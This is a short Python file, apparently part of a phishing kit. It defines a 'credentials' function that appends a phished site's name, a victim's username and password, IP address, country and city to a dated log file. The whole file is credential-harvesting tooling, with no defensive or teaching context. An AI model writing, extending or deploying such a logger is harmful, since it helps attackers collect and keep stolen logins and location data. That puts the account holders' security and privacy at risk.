from time import strftime
from os import getcwd
def credentials(data, fish):
    
    file_name = fish + strftime('-%y%m%d.txt')
    msg = '''
{site}
{user}
{passwd}
{ip}
{country}
{city}

    '''.format(
            site=fish, 
            user=data[0].strip(),
            passwd=data[1].strip(),
            ip=data[2].strip(), 
            country=data[3].strip(),
            city=data[4].strip()
            )    
    
    with open(getcwd()+'/Logs/'+file_name, 'a') as f:
        f.write(msg)

